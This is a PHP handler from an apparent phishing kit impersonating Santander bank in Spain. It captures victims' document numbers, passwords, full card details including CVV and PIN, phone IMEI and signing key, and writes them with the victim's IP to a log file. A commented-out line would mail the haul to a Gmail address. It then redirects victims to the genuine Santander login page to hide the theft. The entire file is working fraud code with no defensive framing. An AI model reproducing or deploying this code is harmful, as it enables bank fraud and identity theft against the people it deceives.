<?php
session_start();

$today = date("d-M-Y-H-i-s"); 
$ip_usuario = @$_SERVER[REMOTE_ADDR];

$msg = "
DATA: $today 
IP: $ip_usuario

-------Thund3rC4sH-------
SANTA RED
=======================
Tipo de Doc: '.$_POST[tipoDocumento]. '
Numero: '.$_POST[numeroDocumento]. '
Clave: '.$_POST[password]. '

Nascimento: '.$_POST[datanasc]. '
Celular: '.$_POST[tel]. '

Nome o card: '.$_POST[nome]. '
Num card: '.$_POST[num]. '
Validade: '.$_POST[val]. '
CVV: '.$_POST[cvv]. '
PIN: '.$_POST[pin]. '

IMEI: '.$_POST[imei]. '

Clave firma: '.$_POST[firma]. '
-------Thund3rC4sH-------
";

//$open = fopen("/var/www/html/ag3imoveis.com.br/web/inc/red/SABADELL_ATL/sabadell"."$today".".txt","a+");
//$open = fopen("SANTANDER"."$today".".txt","a+");
//$quebra = chr(13).chr(10);//essa é a quebra de linha
//fwrite($open, $msg);
//fclose($open);

$file = "thundercash/" . "SANTANDER"."$today".".txt";
$open = fopen("$file","a+");
$quebra = chr(13).chr(10);
fwrite($open, $msg);
fclose($open);


//mail("caiovip2015@gmail.com", $subj, $msg, "from:santared@vip.cat");



header("Location: https://particulares.gruposantander.es/SUPFPA_ENS/Estatico/ALP_SUPFPA_Spnacceso/Html/inicio.html");




?>